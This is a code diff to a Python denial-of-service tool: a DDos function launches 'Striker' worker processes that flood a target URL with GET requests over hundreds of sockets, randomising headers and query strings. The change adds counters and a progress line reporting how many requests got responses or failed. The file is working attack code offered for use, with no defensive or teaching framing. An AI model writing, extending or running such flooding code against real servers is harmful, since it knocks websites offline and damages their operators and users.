@@ -6,7 +6,7 @@ USER_AGENT_PARTS = {'os': {'linux': {'name': ['Linux x86_64', 'Linux i386'], 'ex
 def checkUrl(url): return bool(match(compile(r'^(?:http)s?://(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?))', 2), url))
 def DDos(url: str, sockets = 500, threads = 10):
     assert checkUrl(url)
-    workersQueue = [Striker(url, sockets) for i in range(threads)]
+    workersQueue = [Striker(url, sockets, not i, threads) for i in range(threads)]
     for worker in workersQueue: worker.start()
     while workersQueue:
         try:
@@ -15,10 +15,11 @@ def DDos(url: str, sockets = 500, threads = 10):
                 else: workersQueue.remove(worker)
         except (KeyboardInterrupt, SystemExit):
             for worker in workersQueue: worker.stop()
+    print()
 class Striker(Process):
-    def __init__(self, url, sockets):
+    def __init__(self, url, sockets, printer, threads):
         super(Striker, self).__init__()
-        self.socks, self.runnable, self.host, self.url, self.sockets, self.ssl = [], True, url.split("/")[2], "/".join(url.split("/")[3:]).split(";")[0].split("?")[0].split("#")[0], sockets, url.startswith('https')
+        self.packets, self.socks, self.runnable, self.host, self.url, self.sockets, self.ssl, self.printer, self.threads = [0, 0], [], True, url.split("/")[2], "/".join(url.split("/")[3:]).split(";")[0].split("?")[0].split("#")[0], sockets, url.startswith('https'), printer, threads
     def __del__(self): self.stop()
     def run(self):
         while self.runnable:
@@ -30,9 +31,12 @@ class Striker(Process):
                     shuffle(random_keys)
                     for header_name in random_keys: headers[header_name] = r_headers[header_name]
                     conn_req.request("GET", url, None, headers)
-                for conn_resp in self.socks: conn_resp.getresponse() # send packet
+                for conn_resp in self.socks:
+                    conn_resp.getresponse()
+                    self.packets[0] += 1
                 for conn in self.socks: conn.close()
-            except: pass # packet died
+            except: self.packets[1] += 1
+            if self.printer: print(f"{self.packets[0] * self.threads} packets got a response and {self.packets[1] * self.threads} died", end = "\r")
     def generateQueryString(self, ammount = 1): return '&'.join(["{0}={1}".format("".join([chr(choice(list(range(97, 122)) + list(range(65, 90)) + list(range(48, 57)))) for i in range(0, randint(3,10))]), "".join([chr(choice(list(range(97, 122)) + list(range(65, 90)) + list(range(48, 57)))) for i in range(0, randint(3,20))])) for i in range(ammount)])
     def generateData(self):
         returnCode, param_joiner = 0, "?"
